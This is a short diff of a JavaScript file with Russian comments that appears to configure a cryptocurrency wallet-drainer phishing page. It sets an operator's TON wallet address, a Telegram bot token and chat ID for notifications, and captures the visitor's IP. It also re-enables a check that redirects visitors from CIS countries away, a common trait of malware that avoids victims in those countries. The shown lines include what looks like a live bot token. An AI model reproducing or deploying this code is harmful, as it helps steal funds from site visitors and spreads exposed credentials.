@@ -2,12 +2,12 @@ var mainWallet = "UQA9or9rMdG8vk8wSX20LRapZgTUslxrHt-Oa4JCcAynwEEi"; //Ваш к
 var tgBotToken = "7828861073:AAHBgan5y0jpg24QxtNAa36PGJHggto19sM"; //Токен от бота телеграмм
 var tgChat = "1447071887"; //Ваш телеграмм-канал
 
+
+
 var domain = window.location.hostname;
 var ipUser;
-var countryUser;
 
-//Перенаправление стран СНГ (УБРАЛ ДЛЯ ТЕСТИРОВАНИЯ)
-/*fetch('https://ipapi.co/json/').then(response => response.json()).then(data => {
+fetch('https://ipapi.co/json/').then(response => response.json()).then(data => {
     const country = data.country;
     if (country === 'RU' || country === 'KZ' || country === 'BY' || country === 'UA' || country === 'AM' || country === 'AZ' || country === 'KG' || country === 'MD' || country === 'UZ') {
         window.location.replace('https://ton.org');
